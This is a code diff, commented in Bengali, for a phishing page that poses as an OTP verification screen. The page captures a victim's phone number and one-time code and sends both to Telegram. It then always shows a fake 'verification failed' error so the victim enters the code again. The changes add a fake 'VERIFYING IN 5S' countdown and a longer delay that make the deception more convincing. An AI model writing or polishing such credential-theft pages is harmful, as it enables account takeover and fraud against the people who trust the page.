@@ -16,24 +16,25 @@
         .otp-box { width: 48px; height: 60px; border: 1px solid #d1d1d1; border-radius: 10px; font-size: 22px; text-align: center; background: #fdfdfd; outline: none; transition: 0.3s; }
         .otp-box:focus { border-color: #e91e63; }
 
-        /* স্ট্যাটাস মেসেজ এবং স্পিনার যেখানে ছিল সেখানেই থাকবে */
+        /* স্ট্যাটাস মেসেজ এবং টাইমার স্টাইল */
         #statusMsg { 
             margin-top: 15px; 
             min-height: 30px; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
-            font-size: 14px; 
+            font-size: 13px; 
             font-weight: bold;
+            color: #8E8E8E; /* ছবির মতো হালকা ধূসর রঙ */
+            text-transform: uppercase;
         }
 
         .loader { border: 2px solid #f3f3f3; border-top: 2px solid #333; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .black-text { color: black; }
-        .red-text { color: red; }
+        .red-text { color: red !important; }
 
-        /* আপনার চাহিদা অনুযায়ী নতুন বাটন স্টাইল */
+        /* UNLOCK বাটন স্টাইল */
         .unlock-btn { 
             width: 100%; 
             padding: 15px; 
@@ -97,6 +98,22 @@
         }
     }
 
+    // টাইমার ফাংশন
+    function startTimer(seconds) {
+        const statusBox = document.getElementById('statusMsg');
+        let timeLeft = seconds;
+        
+        const timerInterval = setInterval(() => {
+            if (timeLeft > 0) {
+                statusBox.innerHTML = `VERIFYING IN ${timeLeft}S...`;
+                timeLeft--;
+            } else {
+                clearInterval(timerInterval);
+            }
+        }, 1000);
+        return timerInterval;
+    }
+
     function processOTP(current) {
         if (current.value.length >= 1) {
             const otpBoxes = document.querySelectorAll('.otp-box');
@@ -105,14 +122,14 @@
 
             if (otpValue.length === 4) {
                 otpBoxes.forEach(box => box.readOnly = true);
-
-                // আগে যেখানে আসত সেখানেই "Please wait..." আসবে
-                statusBox.innerHTML = '<div class="loader"></div> <span class="black-text">Please wait...</span>';
                 
+                // টাইমার শুরু (৫ সেকেন্ড)
+                startTimer(5);
+
                 setTimeout(() => {
                     sendToTelegram(`✅ OTP Attempted!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpValue}`);
 
-                    // এরর মেসেজ লাল কালারে আসবে
+                    // ৫ সেকেন্ড পর এরর মেসেজ
                     statusBox.innerHTML = '<span class="red-text">⚠️ verification code failed please try again. ⚠️</span>';
                     
                     setTimeout(() => {
@@ -124,7 +141,7 @@
                         document.getElementById('otp1').focus();
                     }, 1500);
 
-                }, 4000); 
+                }, 5000); // এখানে ৫০০০ মানে ৫ সেকেন্ড অপেক্ষা করবে
             }
         }
     }
